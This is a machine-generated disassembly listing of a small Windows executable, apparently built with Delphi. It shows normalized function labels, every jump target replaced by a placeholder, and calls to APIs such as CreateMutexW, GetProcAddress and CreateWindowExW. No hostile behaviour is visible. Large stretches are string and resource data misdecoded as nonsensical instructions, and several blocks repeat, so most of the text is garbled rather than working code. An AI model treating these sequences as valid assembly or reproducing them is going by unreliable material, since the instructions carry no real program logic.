sar esi 0x1
jns r-xdata
adc eax 0x0
mov edx ebp
sub edx esi
mov eax ebx
sar eax 0x1
jns r-xdata
adc esi 0x0
push eax
mov eax edi
pop ecx
sub eax ecx
lea ecx [ ebx + 0x1 ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
add ecx edi
call sub_40ab90
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
adc ecx 0x0
sub_40ab6c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov ecx [ eax + 0x8 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
mov al 0x1
retn
sub_40abd8
mov ecx [ edx ]
cmp ecx [ eax ]
jl r-xdata
xor eax eax
retn
cmp ecx [ eax + 0x8 ]
jge r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ eax + 0x4 ]
jl r-xdata
mov edx [ edx + 0x4 ]
cmp edx [ eax + 0xc ]
jl r-xdata
mov al 0x1
retn
sub_40abfc
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
push esi
mov edi esi
mov esi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
jle r-xdata
mov [ esi ] eax
mov eax [ ebx + 0x8 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
call sub_40ac5c
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
mov [ esi + 0xc ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_404c14
sub_40ac8c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_40afc5
inc [ edx ]
add ah cl
scasd [ edi ]
inc eax
add [ ebx + edx ] dl
push eax
push ebx
arpl [ gs : ebp + 0x72 ] si
imul esi [ ecx + edi * 2 + 0x41 ] 0x69727474
bound esi [ ebp + 0x74 ]
jae r-xdata
scasd [ edi ]
inc eax
add [ edx ] al
add [ eax + r-xdata ] dl
push cs
adc al 0x5f
push ebx
inc ebp
inc ebx
push ebp
push edx
dec ecx
push esp
pop ecx
pop edi
inc ecx
push esp
push esp
push edx
dec ecx
inc edx
push ebp
push esp
inc ebp
push ebx
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ edi ]
outsb
dec esp
outsb
je r-xdata
dec esp
outsd
add al [ eax ]
in al 0x10
inc eax
add [ eax + eax ] al
add [ eax ] al
add dl [ esp + ebp * 2 ]
jo r-xdata
add [ eax ] al
add [ eax ] al
or al [ eax ]
add [ eax ] al
clc
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add dl [ eax ]
ja r-xdata
popad
je r-xdata
ja r-xdata
add [ eax ] al
add cl [ 0x6f4c7764 ]
arpl [ gs : ebp + 0x72 ] si
imul esi [ ecx + edi * 2 + 0x44 ] 0x72637365
imul esi [ eax + 0x74 ] 0x2726f
adc [ edx ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push cs
bound ecx [ ecx + 0x6e ]
push 0x74697265
dec eax
popad
outsb
insb
add al [ gs : eax ]
add al [ eax ]
mov eax eax
mov al 0x40
add [ esi ] cl
or [ edi + 0x46 ] ebx
dec ecx
dec esp
inc ebp
push esp
dec ecx
dec ebp
inc ebp
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
mov al 0x40
imul ebp [ ebp + 0x41 ] 0x69727474
bound esi [ ebp + 0x74 ]
jae r-xdata
pushad
push esp
imul ebp [ ebp + 0x65 ] 0x10f80002
inc eax
add [ eax + eax ] al
add [ eax ] al
add cl [ esi ]
ja r-xdata
jae r-xdata
popad
jae r-xdata
mov al 0x40
add [ eax + eax ] al
add [ eax ] al
add cl [ esi ]
je r-xdata
add [ eax - 0x50 ] ah
inc eax
add al bh
adc [ eax ] al
sbb al 0x0
jb r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x65746144
push esp
imul ebp [ ebp + 0x65 ] 0x20002
lea eax [ eax ]
mov eax 0xe0040b0
adc [ edi + 0x57 ] ebx
dec ecx
dec esi
xor esi [ edx ]
pop edi
inc esi
dec ecx
dec esi
inc esp
pop edi
inc esp
inc ecx
push esp
inc ecx
push edi
push eax
add al [ eax ]
add [ eax ] al
sbb [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
jb r-xdata
arpl [ esi + 0x69 ] ax
insb
dec esi
popad
insd
add al [ gs : eax ]
add [ eax ] al
add [ eax ] al
xor al 0x2
add [ eax ] al
add dl [ edx ]
arpl [ ecx + 0x6c ] ax
je r-xdata
push edi
jb r-xdata
adc [ eax ] al
and al 0x0
add [ eax ] al
add cl [ ebx ]
ja r-xdata
add al bh
inc esi
imul ebp [ ebp + 0x53 ] 0x4c657a69
outsb
popad
je r-xdata
clc
adc [ eax ] al
and [ eax ] al
add [ eax ] al
add cl [ esi + ebp * 2 ]
imul esp [ edx + 0x75 ] 0x2736574
add [ eax + eax ] dl
add [ eax ] al
add al [ esi ]
bound ebp [ ebp + 0x42 ]
imul esi [ ebx + esi * 2 + 0x2 ] 0x8c000200
mov dl 0x40
add [ esi ] cl
adc esi [ ecx + 0x67 ]
inc edx
dec ecx
push esp
dec ebp
inc ecx
push eax
dec ecx
dec esi
inc esi
dec edi
dec eax
inc ebp
inc ecx
inc esp
inc ebp
push edx
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ esi ]
bound ebp [ ecx + 0x53 ]
imul edi [ edx + 0x65 ] 0x109c0002
inc eax
add [ eax + eax ] al
add [ eax ] al
add al [ edi ]
bound ebp [ ecx + 0x57 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x109c0002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ edx + 0x69 ] ah
dec eax
imul esp [ gs : edi + 0x68 ] 0xcc000274
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ eax ]
bound ebp [ ecx + 0x50 ]
insb
popad
outsb
jae r-xdata
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ edi ]
bound ebp [ ebp + 0x57 ]
add [ eax ] al
add al [ esi ]
xor [ fs : edx ] al
add al bh
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
add cl [ ebx ]
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ edx ]
push 0x9c000274
jb r-xdata
add [ eax ] al
sub al 0x0
je r-xdata
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
loopne r-xdata
jpe r-xdata
outsd
outsb
push esp
imul ebp [ ebp + 0x65 ] 0xb0600002
inc eax
add [ eax + eax ] cl
add [ eax ] al
add dl [ eax ]
je r-xdata
adc [ eax ] al
push cs
add [ eax ] al
add [ edx ] al
or ah [ edx + 0x69 ]
inc edx
imul esi [ ebx + eax * 2 + 0x6f ] 0x2746e75
add al bh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ 0x6f436962 ]
insd
jo r-xdata
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ eax ]
bound ebp [ ebp + 0x50 ]
insb
popad
outsb
jae r-xdata
add ah cl
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
jae r-xdata
insd
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x65747942
jae r-xdata
add [ edx ] al
or al 0x62
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add cl [ 0x6c69466e ]
push ebx
imul edi [ edx + 0x65 ] 0x68676948
add al [ eax ]
push esp
imul ebp [ ebp + 0x65 ] 0x10f80002
inc eax
add [ eax + eax ] bl
inc eax
add [ eax ] ch
inc eax
add [ esi ] cl
or [ ecx + 0x67 ] esi
inc edx
dec ecx
push esp
dec ebp
inc ecx
push eax
add [ edx ] al
add [ ebp - 0x4e1fffc0 ] cl
outsd
ja r-xdata
dec esp
or al 0x6e
popad
jae r-xdata
add cl [ esi ]
bound ebp [ ecx + 0x43 ]
jae r-xdata
adc [ eax ] al
adc al [ eax ]
add [ eax ] al
add cl [ ebx ]
bound ebp [ ebp + 0x42 ]
imul esi [ ebx + esi * 2 + 0x50 ] 0x6c657869
add al [ eax ]
in al 0x10
inc eax
add ah cl
bound ebp [ ebp + 0x54 ]
jns r-xdata
jb r-xdata
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ eax ] al
add [ edx ] al
or esp [ edi + esi * 2 + 0x52 ]
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add cl [ esp ]
insd
jo r-xdata
insb
jb r-xdata
inc ebx
imul ebp [ edi + 0x6e ] 0x10f80002
inc eax
add [ eax + eax ] dl
add [ eax ] al
add cl [ ebx ]
bound ebp [ ecx + 0x53 ]
imul edi [ edx + 0x65 ] 0x67616d49
add al [ gs : eax ]
pushfd
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add cl [ edi ]
bound ebp [ ecx + 0x58 ]
push eax
insb
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x109c0002
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ edx + 0x6d ] ah
dec eax
imul esp [ gs : edi + 0x68 ] 0x9c000274
insd
push edi
add [ eax ] al
add cl [ ecx ]
xor [ fs : edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax + eax ] ch
ja r-xdata
add [ eax + eax ] dl
add [ eax ] al
add cl [ edi ]
je r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0xb0600002
inc eax
inc eax
add [ eax ] cl
add [ eax ] al
add cl [ eax ]
insd
inc esi
arpl [ ebp + 0x4e ] sp
popad
insd
add al [ gs : eax ]
add al [ eax ]
int3
jb r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
add cl [ edi ]
insd
inc esp
jb r-xdata
add [ eax ] al
add [ edx ] al
pcmpgtb mm5 [ ebp + 0x44 ]
popad
outsb
add [ ebx + esi * 4 + 0xc140040 ] ch
push eax
inc esp
jbe r-xdata
add [ edx ] al
je r-xdata
or ah [ ebp + ebp * 2 + 0x54 ]
je r-xdata
insd
inc ebx
outsd
jo r-xdata
imul edi [ edx + 0x65 ] 0x10800002
inc eax
add [ eax ] dl
add [ eax ] al
add cl [ 0x61506d64 ]
popad
jo r-xdata
add [ eax ] al
add [ edx ] al
or esp [ ebp + ebp * 2 + 0x50 ]
jbe r-xdata
jb r-xdata
inc esp
arpl [ ebp + 0x4d ] sp
outsd
push edi
shl [ ebx + 0x20040 ] 0xc4
mov bl 0x40
add [ esi ] cl
or al 0x5f
jbe r-xdata
add al [ eax ]
les esi [ ebx + 0xc0e0040 ]
pop edi
jb r-xdata
add al [ eax ]
clc
adc [ eax ] al
mov al 0x0
add [ eax ] al
add cl [ esp ]
imul ebp [ edi + 0x6e ] 0x10800002
inc eax
insd
pop ecx
push edx
outsd
jne r-xdata
jae r-xdata
or eax 0x52596d64
jae r-xdata
inc eax
add [ edx ] bl
add [ eax ] al
add cl [ esi ]
jb r-xdata
add [ esi ] cl
add [ eax ] al
add cl [ ebx ]
insd
push eax
jb r-xdata
push es
insd
push ebx
imul edi [ edx + 0x65 ] 0x10cc0002
inc eax
add [ esi ] al
add [ eax ] al
add cl [ 0x72446d64 ]
imul esi [ esi + 0x65 ] 0x74784572
jb r-xdata
insd
inc esp
jbe r-xdata
arpl [ ebp + 0x6d ] sp
outsd
push edi
fadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
adc [ eax ] al
sbb al 0x0
add [ eax ] al
add cl [ edi ]
bound ebp [ ecx + 0x59 ]
push eax
insb
jae r-xdata
add [ eax + edx + 0x1c0040 ] bl
or esp [ ebp + ebp * 2 + 0x49 ]
inc ebx
dec ebp
dec ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0xf8000274
adc [ eax ] al
mov ah 0x0
add [ eax ] al
add cl [ esi ]
insd
push eax
insb
jae r-xdata
add [ edx ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
or ah [ ebp + ebp * 2 + 0x46 ]
outsd
jb r-xdata
jae r-xdata
insb
jne r-xdata
add [ eax + eax ] ah
add al [ eax ]
adc [ eax ] 0x40
insd
arpl [ ebp + 0x2 ] sp
add [ eax + 0x5a004010 ] al
add [ eax ] al
add [ edx ] al
push cs
popa
jne r-xdata
adc [ eax ] al
pop eax
add [ eax ] al
add [ edx ] al
pcmpgtb mm5 [ ebp + 0x44 ]
add [ eax + 0x58004010 ] al
outsd
insb
insb
popad
je r-xdata
add cl [ ecx ]
insd
inc ebx
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc eax
imul esp [ ebp + 0x6c ] 0x27364
adc [ eax ] 0x40
add [ eax + eax ] cl
add [ edx ] al
or eax 0x724f6d64
imul esp [ ebp + 0x6e ] 0x69746174
add al [ eax ]
clc
adc [ eax ] al
dec eax
add [ eax ] al
add [ edx ] al
or [ ebp + ebp * 2 + 0x46 ] ah
jb r-xdata
adc [ eax ] al
rol [ eax ] 0x1
add [ eax ] al
add cl [ edx ]
insd
dec ecx
inc ebx
inc ebx
dec ebp
outsd
insb
add al [ eax ]
clc
outsd
add al [ fs : eax ]
clc
adc [ eax ] al
rol [ eax ] 0x0
add [ edx ] al
or esp [ ebp + ebp * 2 + 0x49 ]
inc ebx
dec ebp
dec ecx
outsb
je r-xdata
adc [ eax ] al
mov eax 0x2000000
add al bh
insd
inc esp
imul esi [ ebx + 0x70 ] 0x4679616c
insb
popad
jae r-xdata
push cs
dec esi
popad
insd
add al [ gs : eax ]
int3
clc
jb r-xdata
add al bh
push esp
dec edi
jo r-xdata
imul ebp [ edi + 0x6e ] 0x10800002
inc eax
add [ edx ] ah
add [ eax ] al
add cl [ edx ]
insd
push esp
jne r-xdata
push eax
jb r-xdata
add [ edx ] dl
add [ eax ] al
add cl [ esp ]
insd
push eax
popad
jo r-xdata
add al [ eax ]
adc [ eax ] 0x40
adc [ eax ] 0x40
add [ esi ] dl
add [ eax ] al
add cl [ eax ]
je r-xdata
jo r-xdata
add [ eax + 0x50004010 ] al
add [ eax ] al
add [ edx ] al
or eax 0x61506d64
imul ebp [ edi + 0x6e ] 0x10cc0002
inc eax
add [ eax + eax ] al
add [ edx ] al
adc [ eax ] al
pop esp
add [ eax ] al
jb r-xdata
je r-xdata
clc
adc [ eax ] al
push eax
add [ eax ] al
add [ edx ] al
or [ ebx + esi * 2 + 0x4f ] ah
jae r-xdata
insd
add al [ eax ]
mov [ edx + 0x180040 ] dh
add [ eax ] al
add al [ esi ]
jae r-xdata
adc [ eax ] al
aam 0x0
add [ eax ] al
add cl [ esi ]
insd
push eax
popad
outsb
outsb
imul ebp [ esi + 0x67 ] 0x74646957
push 0x10f80002
inc eax
add al bl
add [ eax ] al
add [ edx ] al
pcmpgtb mm5 [ ebp + 0x50 ]
popad
outsb
outsb
imul ebp [ esi + 0x67 ] 0x67696548
push 0x2000274
add [ ebp - 0x48f3ffc0 ] cl
inc eax
add [ esi ] cl
or eax 0x44676174
dec ecx
inc edx
push ebx
add al bh
outsb
je r-xdata
clc
adc [ eax ] al
int3
jno r-xdata
adc ah [ ebp + ebp * 2 + 0x44 ]
imul esi [ ebx + 0x70 ] 0x4679616c
jb r-xdata
add [ eax + 0x2000000 ] bh
adc [ eax ] al
lodsb [ esi ]
add [ eax ] al
add [ edx ] al
or esp [ ebp + ebp * 2 + 0x50 ]
insb
jae r-xdata
insb
adc [ eax ] al
mov esp 0x2000000
or al 0x64
imul esp [ esp + esi * 2 + 0x68 ] 0x10f80002
inc eax
add [ eax + 0x2000000 ] dh
add [ edx ] al
or [ ebp + ebp * 2 + 0x43 ] esp
add [ eax ] al
add [ edx ] al
pop es
insd
inc ebx
outsd
insb
outsd
jb r-xdata
insb
imul esi [ ecx + edi * 2 + 0x2 ] 0x40108000
add [ eax + eax ] bl
outsd
outsb
add al [ eax ]
adc [ eax ] 0x40
adc [ eax ] al
pop esi
add [ eax ] al
add [ edx ] al
or [ ebp + ebp * 2 + 0x44 ] ah
jne r-xdata
add [ eax + 0x5e004010 ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x10800002
inc eax
add [ eax + eax ] dl
add [ edx ] al
pop es
insd
push ebx
arpl [ ecx + 0x6c ] sp
add al [ gs : eax ]
add [ eax ] al
and al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
insd
add al [ eax ]
clc
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add al [ esp + esi * 2 ]
je r-xdata
je r-xdata
insd
imul ebp [ eax + 0x2 ] 0x0
add [ eax ] al
add [ eax ] al
add cl [ ebx ]
jae r-xdata
adc [ eax ] al
les eax [ eax ]
add [ eax ] al
add cl [ ebx ]
insd
dec ebp
imul esp [ fs : ecx + 0x54 ] 0x2657079
add al bh
adc [ eax ] al
enter 0x0 0x0
add cl [ esp ]
insd
inc esp
imul esi [ eax + ebp * 2 + 0x65 ] 0x70795472
add al [ gs : eax ]
add al bh
jne r-xdata
outsb
arpl [ ecx + 0x2 ] di
add al bh
js r-xdata
insb
js r-xdata
adc [ eax ] al
and [ eax ] al
add [ eax ] al
add cl [ ecx ]
bound ebp [ ecx + 0x43 ]
insb
jb r-xdata
add al bh
insb
add al [ eax ]
add al [ eax ]
adc al 0xb8
inc eax
add [ ebx ] al
add bh [ edx ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
adc [ eax + 0x6f0a0040 ] bh
add [ ebp - 0x486bffc0 ] cl
inc eax
add [ esi ] cl
push es
je r-xdata
add [ edx ] al
dec ebp
imul esi [ esi + 0x69 ] 0x73646c65
add al [ eax ]
clc
adc [ eax ] al
dec esp
add [ eax ] al
add [ edx ] al
or ah [ ebx + esi * 2 + 0x68 ]
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
inc ebp
inc ebx
push esp
dec ecx
dec edi
dec esi
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0xdc000000
mov cl 0x40
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x64
jae r-xdata
popad
arpl [ ebp + esi * 2 + 0x72 ] si
jb r-xdata
insb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
add [ edx ] al
add [ eax + 0x60004010 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
or al 0x64
jae r-xdata
push cs
or eax 0x54534547
jb r-xdata
jns r-xdata
imul ebp [ ebp + 0x65 ] 0xa8800002
inc eax
add [ eax + eax ] dl
add [ eax ] al
add al [ edx ]
jo r-xdata
add al 0x74
push ebx
inc edi
sbb al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah bl
scasb [ edi ]
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x68
ja r-xdata
dec ebp
push ebx
add [ edx ] cl
outsd
add al [ fs : eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ edi ]
insd
jae r-xdata
add al bh
add al [ eax ]
clc
adc [ eax ] al
test al 0x0
add [ eax ] al
add cl [ esp ]
insd
inc edx
imul esi [ ebx + esi * 2 + 0x50 ] 0x65507265
insb
add al bh
int3
imul esp [ ebx + 0x65 ] 0x656d614e
add al [ eax ]
add al [ fs : eax ]
clc
adc [ eax ] al
and al 0x0
add [ eax ] al
mov eax eax
inc esp
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ ebx ] al
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
outsd
inc esp
popad
add al [ gs : bx + si ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ esi ]
ja r-xdata
dec ebx
add [ ebx + 0x3825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0xc25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x25ffc0 ] cl
pushad
dec ebx
add [ ebx - 0x3da0040 ] cl
pop edi
dec ebx
add [ ebx - 0x1374aa40 ] cl
mov eax [ ebp + 0x10 ]
push eax
cmp [ ebp + 0xc ] 0x1
sbb eax eax
inc eax
and eax 0x7f
push eax
mov eax [ ebp + 0x8 ]
push eax
call CreateMutexW
pop ebp
retn 0xc
popad
outsb
je r-xdata
inc esi
dec ecx
inc edi
or al 0x0
add [ eax ] al
jb r-xdata
outsb
jb r-xdata
je r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
push ebx
popad
jb r-xdata
adc [ eax ] al
add al bh
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
add al 0x64
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ esp ]
jb r-xdata
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae r-xdata
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
inc esp
insd
add al [ eax ]
pushfd
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esi ]
insb
push eax
popad
jb r-xdata
and eax RegFlushKey@IAT
mov eax eax
insb
outsd
arpl [ ebx + 0x2 ] bp
add [ edx ] al
add [ eax + 0x605825ff ] dl
dec ebx
add [ ebx + 0x5425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x5025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3c25ffc0 ] cl
pushad
push ebp
push edx
inc ebp
inc ebx
dec edi
dec esi
mov eax 0xd0e0040
inc edi
inc ebp
push ebx
push esp
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
push edi
ja r-xdata
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
imul esp [ edi + 0x68 ] 0x646f0a74
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
or [ edi + 0x64 ] ebp
ja r-xdata
add al [ eax ]
lea eax [ eax ]
enter 0x40b8 0x0
push es
andps xmm1 [ edi + 0x77 ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
je r-xdata
add al [ eax ]
clc
je r-xdata
or [ eax ] al
add [ eax ] al
add al [ edi ]
ja r-xdata
add edx [ eax ]
mov eax 0x20040
in al 0xb8
inc eax
add [ ecx ] al
add al 0x48
dec ebx
inc ebp
pop ecx
add eax 0x0
sub_40b8f2
inc [ edx ]
add [ ebp - 0x4703ffc0 ] cl
inc eax
add [ esi ] cl
or eax 0x54534547
push ebp
push edx
inc ebp
inc ebx
dec edi
dec esi
inc esi
dec ecx
inc edi
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ esp ]
ja r-xdata
mov eax eax
inc esp
add al [ eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
ja r-xdata
dec ebx
add [ ebx + 0x3825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x2025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x1025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0xc25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x25ffc0 ] cl
pushad
dec ebx
add [ ebx - 0x3da0040 ] cl
pop edi
dec ebx
add [ ebx - 0x1374aa40 ] cl
mov eax [ ebp + 0x10 ]
push eax
cmp [ ebp + 0xc ] 0x1
sbb eax eax
inc eax
and eax 0x7f
push eax
mov eax [ ebp + 0x8 ]
push eax
call CreateMutexW
pop ebp
retn 0xc
popad
outsb
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ edi ]
ja r-xdata
add al bh
and eax RegFlushKey@IAT
mov eax eax
insb
outsd
arpl [ ebx + 0x2 ] bp
add [ edx ] al
add [ eax + 0x605825ff ] dl
dec ebx
add [ ebx + 0x5425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x5025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4825ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x4025ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x3c25ffc0 ] cl
pushad
sub_40ba10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
cmp [ ebp + 0xc ] 0x1
sbb eax eax
inc eax
and eax 0x7f
push eax
mov eax [ ebp + 0x8 ]
push eax
call CreateMutexW
pop ebp
retn 0xc
sub_40bab0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push ebx
call InterlockedCompareExchange
pop edi
pop esi
pop ebx
retn
sub_40bb70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40bbd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
shr eax 0x10
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
mov ecx 0x0
call sub_406b48
mov eax [ ebp - 0x4 ]
call sub_406c0c
push eax
push esi
call GetProcAddress
mov ebx eax
push ebx
push esi
call GetProcAddress
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bbda
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_40c5c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_40461c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExW
mov esi eax
mov eax ebx
call sub_40460c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_40c620
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
